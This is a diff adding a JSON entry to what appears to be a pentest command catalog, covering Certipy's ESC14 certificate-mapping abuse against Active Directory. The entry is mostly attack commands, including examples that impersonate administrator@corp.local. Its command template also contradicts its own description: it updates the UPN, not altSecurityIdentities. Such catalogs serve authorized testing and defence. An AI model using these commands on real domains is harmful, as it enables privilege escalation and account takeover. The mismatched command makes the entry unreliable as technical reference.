@@ -1,0 +1,18 @@
+{
+  "id": "certipy-esc14",
+  "name": "Certipy ESC14 (altSecurityIdentities Mapping)",
+  "command": "certipy account update -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -user '<victim>' -upn '<target>@<domain>'",
+  "description": "ESC14: weak explicit certificate mapping via altSecurityIdentities. With write access over a victim object, set an explicit mapping that lets a certificate you control authenticate as the victim. Combine with `account update` to write the attribute, then `auth -pfx` with your existing cert.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap", "kerberos"],
+  "tags": ["certipy", "adcs", "esc14", "altsecurityidentities", "explicit-mapping"],
+  "references": [
+    { "title": "Certipy v5 release notes", "url": "https://github.com/ly4k/Certipy/releases" },
+    { "title": "ESC14 writeup", "url": "https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9" }
+  ],
+  "examples": [
+    "certipy account update -u jdoe@corp.local -p Password123! -dc-ip 10.10.10.10 -user victim -upn administrator@corp.local",
+    "certipy auth -pfx jdoe.pfx -domain corp.local"
+  ]
+}
